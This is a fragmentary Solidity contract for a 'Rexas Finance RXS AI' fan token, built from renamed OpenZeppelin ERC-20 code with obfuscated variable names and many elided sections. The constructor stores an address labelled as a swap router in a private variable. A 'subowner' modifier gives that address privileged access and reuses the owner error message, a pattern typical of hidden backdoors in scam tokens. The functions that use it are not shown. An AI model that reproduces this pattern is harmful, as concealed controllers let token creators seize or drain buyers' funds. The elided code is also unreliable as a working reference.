...
/// https://x.com/RexasFinanceRXSAI


pragma solidity 0.8.29;

// RexasFinanceRXSAI fan token

interface RexasFinanceRXSAIinterface {
  /**
...
/*
 * @dev Provides information about the current execution RexasFinanceRXSAI20Burnable, including the
 ...
 */
abstract contract RexasFinanceRXSAI20Burnable {
...
// File: @openzeppelin/contracts/access/RexasFinanceRXSAI20Ownable.sol
 ...
 * the owner.
 */
abstract contract RexasFinanceRXSAI20Ownable is RexasFinanceRXSAI20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "RexasFinanceRXSAI20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "RexasFinanceRXSAI20Ownable: new owner is the zero address");
 ...
 * `SafeRexasFinanceRXSAI` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeRexasFinanceRXSAI {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeRexasFinanceRXSAI: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeRexasFinanceRXSAI: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeRexasFinanceRXSAI: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeRexasFinanceRXSAI: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeRexasFinanceRXSAI: modulo by zero");
  }
...
contract RexasFinanceRXSAIToken is RexasFinanceRXSAI20Burnable, RexasFinanceRXSAIinterface, RexasFinanceRXSAI20Ownable {
    
    using SafeRexasFinanceRXSAI for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "Rexas Finance RXS AI";
        _symbol = "Rexas Finance RXS AI";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {RexasFinanceRXSAIinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {RexasFinanceRXSAIinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "RexasFinanceRXSAI20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {RexasFinanceRXSAIinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {RexasFinanceRXSAIinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {RexasFinanceRXSAIinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {RexasFinanceRXSAIinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {RexasFinanceRXSAIinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "RexasFinanceRXSAIinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {RexasFinanceRXSAIinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "RexasFinanceRXSAIinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "RexasFinanceRXSAIinterface: transfer from the zero address");
        require(shippingto != address(0), "RexasFinanceRXSAIinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "RexasFinanceRXSAIinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "RexasFinanceRXSAIinterface: approve from the zero address");
        require(transporteur != address(0), "RexasFinanceRXSAIinterface: approve to the zero address");
